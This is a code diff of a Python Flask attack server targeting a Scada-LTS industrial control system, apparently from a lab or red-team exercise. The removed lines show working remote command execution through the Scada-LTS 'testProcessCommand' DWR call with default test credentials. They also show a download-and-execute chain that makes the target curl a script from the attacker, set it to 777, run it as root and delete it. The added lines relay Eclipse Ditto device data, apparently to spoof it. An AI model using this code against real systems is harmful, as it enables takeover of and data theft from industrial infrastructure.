@@ -1,19 +1,25 @@
-from flask import Flask
-import requests
-import urllib.parse
+from flask import Flask, request, jsonify
 import nmap
 import threading
-import time
-import socket
-import fcntl
-import struct
+from RCE import RCE
+from utils import get_ip_address
 
-PORT = 8080
-scada_url='http://172.16.10.100:8080'
+this_ip = get_ip_address('eth0')
+this_port = 80
+
+scada_url='http://172.16.10.100:8080' # get with scan
+
+with open('scripts/fetch_ip_ditto.sh', 'r') as f:
+    data = f.read()
+with open('scripts/fetch_ip_ditto.sh', 'w') as f:
+    f.write(data % (this_ip, this_port))
+
+ip_ditto = None
+last_data_ditto = {}
+
+rce = RCE(scada_url, 'test', 'test', this_ip, this_port)
 scanner = nmap.PortScanner()
-
 app = Flask(__name__)
-#start_web_server = lambda: app.run(host='0.0.0.0', port=PORT)
 
 @app.route('/get_script/<string:name>')
 def get_script(name):
@@ -22,68 +28,39 @@ def get_script(name):
     with open('scripts/'+name, 'r') as f:
         return f.read()
 
-@app.route('/test')
-def test():
-    print("TEST", flush=True)
-    return "Test"
+@app.route('/ip_ditto', methods=["POST"])
+def route_ip_ditto():
+    ip_ditto = str(request.get_data().decode())
+    print("IP DITTO FRONTEND: "+ip_ditto, flush=True)
 
-def execute_cmd(cmd, scada_url, username, password):
-    res = requests.get(scada_url+f'/ScadaLTS/api/auth/{username}/{password}')
-    jsession_cookie=res.headers['Set-Cookie']
+    with open('scripts/fetch_data_ditto.sh', 'r') as f:
+        data = f.read()
+    with open('scripts/fetch_data_ditto.sh', 'w') as f:
+        f.write(data % (ip_ditto, this_ip, this_port))
 
-    headers = {'Cookie': jsession_cookie,
-    'Content-Type': 'text/plain'}
+    return "Stored"
 
-    cmd = urllib.parse.quote_plus('command:'+cmd)
-    
-    res = requests.post(scada_url+'/ScadaLTS/dwr/call/plaincall/EventHandlersDwr.testProcessCommand.dwr', 
-    headers=headers,
-    data=f"callCount=1&scriptSessionId=&c0-scriptName=EventHandlersDwr&c0-methodName=testProcessCommand&c0-param0={cmd}")
+@app.route('/data_ditto', methods=["POST"])
+def route_data_ditto():
+    json = request.get_json()
+    for thing in json['items']:
+        last_data_ditto[thing['thingId']] = thing['features']
 
-def execute_script(scriptname, this_ip, username, password):
-    global scada_url # temporary solution
-    for i in range(5):
-        print(f"Tentativo {i}", flush=True)
-        try:
-            time.sleep(10)
-            execute_cmd(f"curl {this_ip}:{PORT}/get_script/{scriptname} -o /root/cmd", scada_url, username, password)
-            execute_cmd("chmod 777 /root/cmd", scada_url, username, password)
-            execute_cmd("/root/cmd", scada_url, username, password)
-            time.sleep(5)
-            execute_cmd("rm -f /root/cmd", scada_url, username, password)
-            time.sleep(5)
-        except Exception as e:
-            print("error")
-            print(e)
+    print(last_data_ditto, flush=True)
+    return "Stored"
 
-def get_ip_address(ifname):
-    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    ret = socket.inet_ntoa(fcntl.ioctl(
-        s.fileno(),
-        0x8915,  # SIOCGIFADDR
-        struct.pack('256s', bytes(ifname[:15], 'utf-8'))
-    )[20:24])
-    s.close()
-
-    return ret
+@app.route('/api/2/things/<string:thing_id>/features')
+def route_simulation(thing_id):
+    return last_data_ditto[thing_id]
 
 if __name__ == "__main__":
-    ip = get_ip_address('eth0')
-    print('ip: '+ip)
-    with open('scripts/fetch_and_send.sh', 'r') as f:
-        data = f.read()
-    
-    with open('scripts/fetch_and_send.sh', 'w') as f:
-        f.write(data % (ip, PORT))
-
     ### WEBSERVER
-    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', PORT))
+    webserverThread = threading.Thread(target=app.run, args=('0.0.0.0', this_port))
     webserverThread.start()
 
     ### RCE
-    rceThread = threading.Thread(target=execute_script, args=('fetch_and_send.sh', ip, 'test', 'test'))
-    rceThread.start()
-    #execute_script('fetch_and_send.sh', ip, 'test', 'test')
+    rce.execute_script('fetch_ip_ditto.sh')
+    rce.execute_script('fetch_data_ditto.sh')
 
     # SCAN
     '''
